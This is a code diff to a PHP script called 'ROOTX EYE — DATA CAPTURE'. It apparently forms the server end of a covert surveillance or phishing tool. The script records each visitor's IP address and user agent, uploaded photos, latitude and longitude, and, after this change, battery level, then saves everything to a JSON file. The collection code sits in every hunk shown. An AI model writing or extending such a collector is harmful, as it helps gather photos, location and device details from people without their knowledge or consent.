@@ -1,13 +1,13 @@
 <?php
 // ============================================
-// ROOTX EYE — DATA CAPTURE (Admin Panel)
-// TERA ORIGINAL LOOK + IP-BASED GROUPING
+// ROOTX EYE — DATA CAPTURE (FINAL)
+// IP-Based Grouping + Battery + Preview Support
 // ============================================
 
 $data_dir = 'data/';
 $captures_file = $data_dir . 'captures.json';
 
-// Create directory if not exists
+// Create directories
 if (!is_dir($data_dir)) {
     mkdir($data_dir, 0777, true);
     mkdir($data_dir . 'photos', 0777, true);
@@ -21,11 +21,12 @@ if (file_exists($captures_file)) {
     $all_data = json_decode(file_get_contents($captures_file), true) ?: [];
 }
 
-// Get data from POST/GET
-$type = $_POST['type'] ?? $_GET['type'] ?? 'unknown';
-$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
+// Get data from POST
+$type = $_POST['type'] ?? 'unknown';
+$ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
 $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
 $time = date('Y-m-d H:i:s');
+$battery = $_POST['battery'] ?? null;
 
 // Build capture array
 $capture = [
@@ -35,7 +36,8 @@ $capture = [
     'time' => $time,
     'file' => '',
     'lat' => null,
-    'lng' => null
+    'lng' => null,
+    'battery' => $battery
 ];
 
 // Handle file upload
